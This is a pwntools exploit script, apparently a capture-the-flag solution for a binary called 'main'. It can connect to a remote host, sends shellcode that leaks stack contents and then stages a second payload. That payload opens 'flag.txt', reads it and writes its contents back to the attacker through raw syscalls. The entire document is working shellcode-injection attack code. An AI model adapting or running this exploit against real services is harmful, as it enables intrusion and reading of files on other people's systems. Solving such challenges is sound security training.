#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("172.17.0.2", 5000)
        time.sleep(1)
        pid = process(["pidof", "main"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
symbol-file main
brva 0x0140B
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    sc  = asm("mov r10, rdx")
    sc += asm(shellcraft.write(1, "rsp", 0x50))
    sc += asm(shellcraft.read(0, "r10", 0x100))

    io.sendafter(b">", sc)
    io.recvuntil(b"Presto!\n")
    data = io.recv(0x50)
    chunks = [hex(u64(data[i:i+8])) for i in range(0, len(data), 8)]
    for i in range(len(chunks)):
        print(f"{chunks[i]} -> {hex(i*8)}")
    
    target = int(chunks[6], 16)

    sc = asm("nop") * 0x30 + asm(
        f"""
        read:
            mov rsi, {target}
            mov r8, rsi
            xor rdi, rdi
            mov rdx, 8
            xor rax, rax
            syscall
        """
    )

    sc += asm(
        f"""
        open:
            mov rdi, {target}
            xor rsi, rsi
            xor rdx, rdx
            mov rax, 2
            syscall
        
        read:
            mov rdi, rax
            mov rsi, {target}
            mov rdx, 0x50
            xor rax, rax
            syscall

        write:
            mov rax, 1
            mov rdi, 1
            mov rsi, {target}
            syscall
        """
    )

    io.send(sc)
    io.sendline(b"flag.txt\x00")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

